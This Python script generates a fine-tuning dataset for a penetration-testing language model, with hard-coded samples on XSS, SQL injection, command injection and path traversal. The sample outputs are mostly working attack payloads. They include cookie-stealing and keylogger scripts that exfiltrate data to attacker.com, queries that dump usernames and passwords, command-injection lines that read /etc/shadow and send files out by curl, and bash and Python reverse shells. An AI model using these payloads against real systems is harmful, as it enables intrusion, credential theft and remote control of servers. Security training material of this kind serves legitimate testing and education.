#!/usr/bin/env python3
"""
Synthetic dataset generator for penetration testing LLM fine-tuning.
Generates instruction-following datasets covering XSS, SQLi, and OS Injection.

DISCLAIMER: This tool is intended for authorized security research and education only.
"""

import json
import random
import argparse
from pathlib import Path
from typing import Optional
from dataclasses import dataclass


@dataclass
class Sample:
    instruction: str
    input: str
    output: str
    category: str
    subcategory: str


# ─────────────────────────────────────────────
# XSS Templates
# ─────────────────────────────────────────────
XSS_SAMPLES = [
    Sample(
        instruction="Explain how reflected XSS works and provide a detection methodology.",
        input="Target: login form with 'redirect' URL parameter",
        output="""## Reflected XSS - Detection Methodology

Reflected XSS occurs when user-supplied input is immediately echoed back in the HTTP response without proper sanitization.

### Detection Steps

1. **Identify injection points**
   - URL parameters: `?search=<payload>`
   - Form fields (GET/POST)
   - HTTP headers (Referer, User-Agent, X-Forwarded-For)
   - JSON/XML body parameters

2. **Probe with canary strings**
   ```
   ?redirect=xsstest123
   ```
   Check if `xsstest123` appears in the response source.

3. **Test HTML context**
   ```
   ?redirect=<script>alert(1)</script>
   ?redirect="><script>alert(1)</script>
   ```

4. **Test attribute context**
   ```
   ?redirect=" onmouseover="alert(1)
   ?redirect=' onfocus='alert(1)
   ```

5. **Burp Suite automation**
   - Use Burp Scanner or XSS Validator extension
   - Intruder with XSS payload list

### Tools
- `dalfox url "https://target.com/login?redirect=FUZZ"`
- `kxss` for quick detection
- Browser DevTools → Sources tab to verify payload execution

### WAF Bypass Techniques (if blocked)
```javascript
// HTML entity encoding
?redirect=&lt;script&gt;alert(1)&lt;/script&gt;
// Case variation
?redirect=<ScRiPt>alert(1)</sCrIpT>
// Event handlers
?redirect=" onload="alert(1)
```
""",
        category="xss",
        subcategory="reflected_xss",
    ),
    Sample(
        instruction="Describe stored XSS attack vectors in a comment/forum system.",
        input="",
        output="""## Stored XSS in Comment/Forum Systems

Stored XSS persists in the database and executes for every user who views the affected page.

### High-Risk Injection Points
- Comment body / post content
- Username / display name
- Profile bio / about section
- File upload names
- Notification messages

### Payload Strategies

**Basic test (HTML context)**
```html
<script>alert(document.domain)</script>
```

**Image tag fallback**
```html
<img src=x onerror=alert(1)>
```

**SVG-based**
```html
<svg onload=alert(1)>
```

**Markdown renderers**
```markdown
[click me](javascript:alert(1))
![x](x onerror=alert(1))
```

### Impact Escalation
```javascript
// Session hijacking
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>

// Keylogger
<script>
document.addEventListener('keypress', e =>
  fetch('https://attacker.com/keys?k='+e.key)
)
</script>

// CSRF token exfiltration
<script>
fetch('/api/user/settings')
  .then(r=>r.text())
  .then(d=>fetch('https://attacker.com/?d='+btoa(d)))
</script>
```

### Testing Checklist
- [ ] Test in all MIME contexts (HTML, JSON, JS)
- [ ] Check Content-Type and X-Content-Type-Options headers
- [ ] Verify CSP policy effectiveness
- [ ] Test with and without authentication
""",
        category="xss",
        subcategory="stored_xss",
    ),
    Sample(
        instruction="How do you identify and exploit DOM-based XSS vulnerabilities?",
        input="Single-page application using React, reading URL hash fragment",
        output="""## DOM-Based XSS Detection & Exploitation

DOM XSS occurs entirely client-side — the server never sees the malicious payload.

### Common Source/Sink Pairs

| Source | Sink |
|--------|------|
| `location.hash` | `innerHTML` |
| `location.search` | `document.write()` |
| `document.referrer` | `eval()` |
| `window.name` | `setTimeout(string)` |

### Detection Methodology

1. **Source code review** — search for dangerous sinks:
```bash
grep -rn "innerHTML\|document.write\|eval(" src/
```

2. **Browser DevTools**
   - Sources → Search: `location.hash`, `innerHTML`
   - Console: `document.querySelectorAll('[onclick]')`

3. **Dynamic testing with DOM Invader (Burp)**
   - Inject canary tokens into all sources
   - Monitor sink calls automatically

### Exploitation in React SPA (hash-based routing)

If app does: `document.getElementById('content').innerHTML = location.hash.slice(1)`

```
# Payload in URL
https://target.com/#<img src=x onerror=alert(origin)>

# Encoded variant
https://target.com/#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### React-specific Notes
- React's JSX escapes by default — look for `dangerouslySetInnerHTML`
- `href` with user input can lead to `javascript:` URI injection

### Tools
- **DOM Invader** (Burp Suite Pro)
- **DOMPurify** tester: check if sanitization is bypassable
- **JSPrime** static analysis
""",
        category="xss",
        subcategory="dom_xss",
    ),
]

# ─────────────────────────────────────────────
# SQL Injection Templates
# ─────────────────────────────────────────────
SQLI_SAMPLES = [
    Sample(
        instruction="Explain union-based SQL injection and how to enumerate database schema.",
        input="Target: MySQL, vulnerable parameter: ?id=1",
        output="""## Union-Based SQL Injection — Schema Enumeration

Union-based SQLi appends a `UNION SELECT` to leak data in the HTTP response.

### Prerequisites
1. Determine number of columns in original query
2. Find columns that render in the response
3. Identify database type

### Step 1 — Column Count
```sql
?id=1 ORDER BY 1--     # No error
?id=1 ORDER BY 2--     # No error
?id=1 ORDER BY 3--     # Error → 2 columns
```

Alternative:
```sql
?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--   # ✓ no error
```

### Step 2 — Find Printable Columns
```sql
?id=-1 UNION SELECT 'a',NULL--
?id=-1 UNION SELECT NULL,'a'--
```
Whichever renders "a" in the page is printable.

### Step 3 — Database Fingerprint (MySQL)
```sql
?id=-1 UNION SELECT @@version,NULL--
```

### Step 4 — Enumerate Schemas
```sql
-- List databases
?id=-1 UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- List tables in 'app' database
?id=-1 UNION SELECT table_name,NULL
FROM information_schema.tables
WHERE table_schema='app'--

-- List columns of 'users' table
?id=-1 UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

### Step 5 — Extract Data
```sql
?id=-1 UNION SELECT username,password FROM users--

-- Concatenate multiple columns
?id=-1 UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

### Automation with sqlmap
```bash
sqlmap -u "https://target.com/item?id=1" \
  --technique=U \
  --dbs \
  --batch \
  --level=3
```
""",
        category="sqli",
        subcategory="union_based",
    ),
    Sample(
        instruction="How does blind boolean-based SQL injection work? Provide a manual testing approach.",
        input="Target: PostgreSQL login form, no visible error messages",
        output="""## Blind Boolean-Based SQL Injection

When no data is returned in the response, boolean-based blind SQLi infers data one bit at a time by observing true/false differences in responses.

### Identifying Blind SQLi

```sql
-- Original request returns 200 with content
username=admin'--

-- True condition → same response as valid login
username=admin' AND 1=1--

-- False condition → different response (empty, error, redirect)
username=admin' AND 1=2--
```

If responses differ between `AND 1=1` and `AND 1=2`, it's injectable.

### Binary Search Data Extraction (PostgreSQL)

**Extract database version length:**
```sql
admin' AND LENGTH(version())>10--    # true
admin' AND LENGTH(version())>20--    # true
admin' AND LENGTH(version())>50--    # false → between 20-50
```

**Extract characters one by one:**
```sql
-- First character of version string
admin' AND SUBSTRING(version(),1,1)='P'--
admin' AND ASCII(SUBSTRING(version(),1,1))>80--
admin' AND ASCII(SUBSTRING(version(),1,1))=80--   # 'P' = ASCII 80
```

**Extract table names:**
```sql
admin' AND SUBSTRING(
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema='public' LIMIT 1 OFFSET 0),
  1,1
)='u'--
```

### Automation
```bash
# sqlmap with boolean technique only
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=pass" \
  --technique=B \
  -p username \
  --dbms=postgresql \
  --dump -T users \
  --batch
```

### Response Differentiation Strategies
- **Length-based**: `len(response) > 5000`
- **Content-based**: presence of specific keyword
- **Status-based**: HTTP 200 vs 302
- **DOM-based**: presence of DOM element
""",
        category="sqli",
        subcategory="blind_boolean",
    ),
    Sample(
        instruction="Demonstrate time-based blind SQL injection for data extraction when no response difference is observable.",
        input="Target: MSSQL, no response body differences",
        output="""## Time-Based Blind SQL Injection (MSSQL)

When boolean differences are imperceptible, time delays confirm injection and extract data.

### Basic Confirmation

**MSSQL:**
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--   # 5-second delay → injectable!
'; IF (1=2) WAITFOR DELAY '0:0:5'--   # No delay
```

**MySQL equivalent:** `AND SLEEP(5)`
**PostgreSQL equivalent:** `AND pg_sleep(5)`

### Version Extraction

```sql
-- Is first char of @@version 'M' ?
'; IF (ASCII(SUBSTRING(@@version,1,1))=77) WAITFOR DELAY '0:0:3'--

-- Binary search for efficiency
'; IF (ASCII(SUBSTRING(@@version,1,1))>78) WAITFOR DELAY '0:0:3'--
```

### Schema Enumeration

```sql
-- Count tables in current database
'; IF ((SELECT COUNT(*) FROM information_schema.tables
        WHERE table_type='BASE TABLE')>5)
   WAITFOR DELAY '0:0:3'--

-- Extract first table name, first character
'; IF (ASCII(SUBSTRING(
  (SELECT TOP 1 table_name FROM information_schema.tables
   WHERE table_type='BASE TABLE'),1,1))=85)   -- 'U'
   WAITFOR DELAY '0:0:3'--
```

### Credential Extraction

```sql
'; IF (ASCII(SUBSTRING(
  (SELECT TOP 1 password_hash FROM dbo.users
   WHERE username='admin'),1,1))>100)
   WAITFOR DELAY '0:0:3'--
```

### Handling Network Jitter

Use longer delays (5-10s) and multiple confirmations:
```python
# Python pseudo-code for reliable extraction
def check_char(pos, char_code, threshold=4.5):
    payload = f"'; IF (ASCII(SUBSTRING(@@version,{pos},1))={char_code}) WAITFOR DELAY '0:0:5'--"
    start = time.time()
    send_request(payload)
    return (time.time() - start) >= threshold
```

### sqlmap Automation
```bash
sqlmap -u "https://target.com/search?q=test" \
  --technique=T \
  --dbms=mssql \
  --time-sec=5 \
  --dump -T users \
  --batch
```
""",
        category="sqli",
        subcategory="blind_time",
    ),
]

# ─────────────────────────────────────────────
# OS Injection Templates
# ─────────────────────────────────────────────
OSI_SAMPLES = [
    Sample(
        instruction="How do you detect and exploit OS command injection vulnerabilities in web applications?",
        input="Target: Linux server, file conversion endpoint: POST /api/convert?format=pdf",
        output="""## OS Command Injection — Detection & Exploitation

Command injection occurs when user input is passed to shell functions without proper sanitization.

### Detection

**Time-based detection (blind)**
```bash
# Linux - inject sleep
format=pdf; sleep 5
format=pdf`sleep 5`
format=pdf$(sleep 5)
format=pdf%0asleep%205      # URL-encoded newline

# Windows
format=pdf& timeout /T 5
```

**Out-of-band detection**
```bash
# DNS lookup (use interactsh or Burp Collaborator)
format=pdf;nslookup$(whoami).your-collaborator-id.oastify.com
format=pdf`curl http://your-collaborator-id.oastify.com/$(id)`
```

**Error-based (if errors shown)**
```bash
format=pdf;ls -la /
format=pdf&&cat /etc/passwd
format=pdf|id
```

### Injection Separators

| Separator | Behavior | OS |
|-----------|----------|----|
| `;` | Run sequentially | Unix |
| `&&` | Run if previous succeeds | Both |
| `\|\|` | Run if previous fails | Both |
| `\|` | Pipe output | Both |
| `` ` ` `` | Command substitution | Unix |
| `$()` | Command substitution | Unix |
| `&` | Background / next cmd | Both |
| `\n` `%0a` | Newline separator | Unix |

### Exploitation — Data Exfiltration

```bash
# Read sensitive files
format=pdf;cat /etc/passwd
format=pdf;cat /etc/shadow

# Environment variables (credentials often stored here)
format=pdf;env
format=pdf;cat /proc/self/environ

# Application source code
format=pdf;find / -name "*.py" 2>/dev/null | head -20
format=pdf;cat /var/www/html/config.php

# Out-of-band exfil
format=pdf;curl "http://attacker.com/$(cat /etc/passwd | base64 -w0)"
```

### Reverse Shell

```bash
# Bash reverse shell
format=pdf;bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# URL-encoded
format=pdf%3bbash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.14.1%2f4444%200%3e%261

# Python fallback
format=pdf;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Listener Setup
```bash
nc -lvnp 4444
```
""",
        category="osi",
        subcategory="command_injection",
    ),
    Sample(
        instruction="Explain path traversal attacks and how to escalate them to file read/RCE.",
        input="Target: Node.js application, file download endpoint: GET /download?file=report.pdf",
        output="""## Path Traversal Attack — Detection to RCE

Path traversal allows reading files outside the web root by manipulating file path parameters.

### Basic Detection

```
GET /download?file=../../../etc/passwd
GET /download?file=....//....//....//etc/passwd     # Double encoding bypass
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2fetc%2fpasswd
GET /download?file=..%252f..%252f..%252fetc%252fpasswd   # Double URL encode
```

### Bypass Techniques

| Filter | Bypass |
|--------|--------|
| Strip `../` | `....//` → after strip = `../` |
| URL decode once | `%2e%2e%2f` |
| Null byte (older PHP) | `../../../etc/passwd%00.pdf` |
| Absolute path | `/etc/passwd` |
| Windows | `..\..\..\windows\system32\drivers\etc\hosts` |

### High-Value Target Files (Linux)

```bash
# System files
/etc/passwd
/etc/shadow          # Requires root
/etc/hosts
/proc/self/environ   # App environment variables

# Node.js specific
../../package.json
../../.env           # Database credentials, API keys
../../config/database.js
../../src/app.js     # Source code

# SSH keys
/home/nodeuser/.ssh/id_rsa
/root/.ssh/id_rsa

# Logs
/var/log/nginx/access.log
/var/log/auth.log
```

### Escalation to RCE via Log Poisoning

1. **Write malicious content to log**
```bash
# Inject PHP into User-Agent (if PHP log)
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Inject Node.js code via path traversal to access.log
GET /download?file=../../../var/log/nginx/access.log
```

2. **Trigger execution** (if file is eval'd or require'd)
```
GET /download?file=../../../proc/self/environ&cmd=id
```

### Node.js `require()` Injection

If endpoint does `require(userInput)`:
```javascript
// Load arbitrary JSON as module
?file=../../config/database   // No .json extension needed
// If server-side template:
?file=../../node_modules/ejs/lib/ejs    // Template engine abuse
```

### Tools
```bash
# ffuf with path traversal wordlist
ffuf -u "https://target.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fc 400,403,404

# dotdotpwn
dotdotpwn -m http -h target.com -U "/download?file=TRAVERSAL"
```
""",
        category="osi",
        subcategory="path_traversal",
    ),
]


def build_alpaca_format(sample: Sample) -> dict:
    """Convert a Sample to Alpaca instruction-following format."""
    return {
        "instruction": sample.instruction,
        "input": sample.input,
        "output": sample.output,
        "metadata": {
            "category": sample.category,
            "subcategory": sample.subcategory,
        },
    }


def build_chatml_format(sample: Sample) -> dict:
    """Convert a Sample to ChatML format for chat models."""
    user_content = sample.instruction
    if sample.input:
        user_content += f"\n\nContext: {sample.input}"
    return {
        "messages": [
            {
                "role": "system",
                "content": (
                    "You are an expert penetration tester assisting authorized "
                    "security professionals with vulnerability assessment and "
                    "ethical hacking techniques."
                ),
            },
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": sample.output},
        ],
        "metadata": {
            "category": sample.category,
            "subcategory": sample.subcategory,
        },
    }


def generate_dataset(
    format: str = "alpaca",
    output_path: Optional[str] = None,
    seed: int = 42,
) -> list[dict]:
    """Generate the full dataset and optionally save to file."""
    random.seed(seed)

    all_samples = XSS_SAMPLES + SQLI_SAMPLES + OSI_SAMPLES
    random.shuffle(all_samples)

    if format == "alpaca":
        dataset = [build_alpaca_format(s) for s in all_samples]
    elif format == "chatml":
        dataset = [build_chatml_format(s) for s in all_samples]
    else:
        raise ValueError(f"Unknown format: {format}. Choose 'alpaca' or 'chatml'.")

    if output_path:
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(dataset, f, ensure_ascii=False, indent=2)
        print(f"[+] Dataset saved to {output_path} ({len(dataset)} samples)")

    return dataset


def split_dataset(
    dataset: list[dict],
    train_ratio: float = 0.85,
    val_ratio: float = 0.10,
    output_dir: str = "./datasets/processed",
) -> None:
    """Split dataset into train/val/test and save as JSONL."""
    output = Path(output_dir)
    output.mkdir(parents=True, exist_ok=True)

    n = len(dataset)
    train_end = int(n * train_ratio)
    val_end = train_end + int(n * val_ratio)

    splits = {
        "train": dataset[:train_end],
        "val": dataset[train_end:val_end],
        "test": dataset[val_end:],
    }

    for split_name, split_data in splits.items():
        path = output / f"{split_name}.jsonl"
        with open(path, "w", encoding="utf-8") as f:
            for item in split_data:
                f.write(json.dumps(item, ensure_ascii=False) + "\n")
        print(f"[+] {split_name}: {len(split_data)} samples → {path}")


def main():
    parser = argparse.ArgumentParser(
        description="Generate pentest LLM fine-tuning dataset"
    )
    parser.add_argument(
        "--format",
        choices=["alpaca", "chatml"],
        default="alpaca",
        help="Dataset format",
    )
    parser.add_argument(
        "--output",
        default="./datasets/synthetic/pentest_dataset.json",
        help="Output file path",
    )
    parser.add_argument(
        "--split",
        action="store_true",
        help="Split into train/val/test sets",
    )
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    args = parser.parse_args()

    print("[*] Generating penetration testing dataset...")
    dataset = generate_dataset(
        format=args.format,
        output_path=args.output,
        seed=args.seed,
    )

    print(f"\n[+] Total samples: {len(dataset)}")

    category_counts: dict[str, int] = {}
    for item in dataset:
        cat = item.get("metadata", {}).get("category", "unknown")
        category_counts[cat] = category_counts.get(cat, 0) + 1

    print("\n[*] Category distribution:")
    for cat, count in sorted(category_counts.items()):
        print(f"    {cat}: {count} samples")

    if args.split:
        print("\n[*] Splitting dataset...")
        split_dataset(dataset)


if __name__ == "__main__":
    main()
